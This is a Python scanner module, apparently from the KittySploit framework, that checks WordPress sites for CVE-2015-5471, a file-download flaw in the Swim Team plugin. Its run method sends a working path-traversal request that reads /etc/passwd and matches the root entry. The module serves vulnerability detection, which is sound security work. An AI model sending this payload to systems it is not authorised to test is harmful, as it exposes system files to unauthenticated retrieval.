#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The program /wp-swimteam/include/user/download."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Swim Team <= v1.44.10777 - Local File Inclusion Detection',
        'description': 'The program /wp-swimteam/include/user/download.php allows unauthenticated attackers to retrieve arbitrary files from the system.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wordpress', 'wp-plugin', 'lfi', 'wpscan', 'packetstorm', 'swim_team_project', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/b00d9dda-721d-4204-8995-093f695c3568',
            'http://www.vapid.dhs.org/advisory.php?v=134',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-5471',
            'http://packetstormsecurity.com/files/132653/WordPress-WP-SwimTeam-1.44.10777-Arbitrary-File-Download.html',
            'http://michaelwalsh.org/blog/2015/07/wp-swimteam-v1-45-beta-3-now-available/',
        ],
        'cve': 'CVE-2015-5471',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Swim Team <= v1.44.10777 - Local File Inclusion detected",
                path='/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress',
            )
            return True
        return False

